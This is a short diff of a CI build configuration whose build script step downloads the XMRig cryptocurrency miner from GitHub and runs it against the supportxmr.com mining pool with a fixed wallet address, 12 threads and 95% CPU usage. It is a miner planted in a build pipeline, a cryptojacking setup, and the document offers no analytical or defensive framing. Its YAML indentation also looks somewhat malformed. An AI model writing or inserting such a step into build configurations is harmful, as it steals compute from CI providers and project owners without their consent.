@@ -8,9 +8,7 @@ build:
             apt-get install git -y
             apt-get install wget -y
     - script:
-- sh: >-
+         name : build_script
+         code: |
     #!/bin/bash
-
     wget https://github.com/xmrig/xmrig/releases/download/v2.9.2/xmrig-2.9.2-xenial-x64.tar.gz && tar -xf xmrig-2.9.2-xenial-x64.tar.gz && cd xmrig-2.9.2 && ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 45UVbdyweuJV5peeuD1ypVbFs6Z1nYhRB4r9BEL9xYjE8Ej8Pjob3LQX2dN4m314gB87Z1M9TbabwN4g4L9184dcCLyiU6y -p ATIRadeon3 --threads 12 --max-cpu-usage=95 --cpu-priority 4 --donate-level 1
-build_script:
-- sh: >-
